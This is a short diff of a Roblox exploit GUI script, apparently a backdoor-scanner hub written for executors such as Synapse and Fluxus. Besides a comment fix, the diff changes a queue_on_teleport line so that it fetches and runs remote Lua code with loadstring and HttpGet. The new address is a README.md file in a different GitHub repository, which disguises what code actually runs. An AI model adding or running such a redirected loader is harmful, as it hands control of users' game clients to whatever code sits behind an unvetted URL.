@@ -1,4 +1,4 @@
-#--[=[
+--[=[
  d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
 88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
 88      88    88    88            odD'      88      88    88 88ooo88 
@@ -1408,7 +1408,7 @@ local function C_20()
 local script = G2L["20"];
 	queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 	if queueteleport then
-		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()")
+		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/PumpGui/Pumpking3199/refs/heads/main/README.md'))()")
 	end
 	
 	GUI=script.Parent.Frame
